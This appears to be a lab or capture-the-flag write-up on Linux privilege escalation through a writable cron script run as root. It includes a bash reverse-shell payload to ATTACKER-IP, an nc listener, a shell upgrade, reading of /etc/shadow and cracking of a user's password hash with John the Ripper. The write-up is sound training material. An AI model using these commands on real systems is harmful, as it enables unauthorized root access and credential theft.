
# 📝 ** Cron Jobs Linux Privilege Escalation **

## 📌 **1. Understanding the Scenario**

The target system had multiple cron jobs running every minute:

```
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

Cron jobs run using the **privileges of the user who owns the job**, not the user who created the file.

Since all of these jobs run as **root**, any script we can modify becomes a privilege escalation vector.

---

# 📌 **2. Writable Cron Script – backup.sh**

The file:

```
/home/karen/backup.sh
```

was owned by `karen`:

```
-rwxr-xr-x 1 karen karen 59 /home/karen/backup.sh
```

This means:

✅ Cron runs it as **root**
✅ User `karen` can MODIFY it
➡️ **We can get a root reverse shell**

### ✔ Payload used

```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER-IP/9001 0>&1
```

Make executable:

```bash
chmod +x backup.sh
```

Start listener on attacker:

```bash
nc -nlvp 9001
```

Within one minute, cron executed the script and returned a **root shell**.

---

# 📌 **3. Getting a Fully Interactive Root Shell**

After receiving the reverse shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Now the shell supports job control, clear screen, etc.

---

# 📌 **4. Discovering Other Users (matt, ubuntu, etc.)**

From `/etc/passwd`:

```
ubuntu:x:1000:1000:/home/ubuntu:/bin/bash
karen:x:1001:1001:/home/karen:/bin/sh
matt:x:1002:1002:/home/matt:/bin/sh
```

We saw a user named **matt** (1002) whose password we needed to discover.

Since we have **root**, we can read `/etc/shadow`.

---

# 📌 **5. Extracting Matt’s Password Hash**

```bash
cat /etc/shadow | grep matt
```

Example hash format:

```
matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:...
```

Meaning of `$6$`:

* `$6$` → SHA512 (sha512crypt)
* `$SALT$HASH` → Salt + password hash

---

# 📌 **6. Cracking Matt’s Password Using John the Ripper**

### ✔ Save the hash to a file:

```bash
echo 'matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.' > matt_hash.txt
```

### ✔ Crack it with rockyou:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt matt_hash.txt
```

### ✔ Show cracked passwords:

```bash
john --show matt_hash.txt
```

If successfully cracked, the password is displayed.

---

# 📌 **7. Switching to Matt’s Account**

Two methods:

### ✔ Without password (because we are root)

```bash
su - matt --shell=/bin/bash
```

### ✔ Using cracked password

```bash
su matt
```

---

# 📌 **8. Why “su matt” Asked for Password but Showed No Characters?**

Linux hides password input:

* No stars
* No dots
* No output

This is normal.
It does not mean the keyboard is not working.

---

# 📌 **9. Key Takeaways**

* **Cron jobs running as root** + **writable script** = easy privilege escalation.
* After getting **root**, you can freely:

  * read `/etc/shadow`
  * extract password hashes
  * crack passwords offline
* `$6$` indicates SHA-512 crypt → `sha512crypt` in John
* Always use **full hash strings**; truncation gives “No password hashes loaded”.


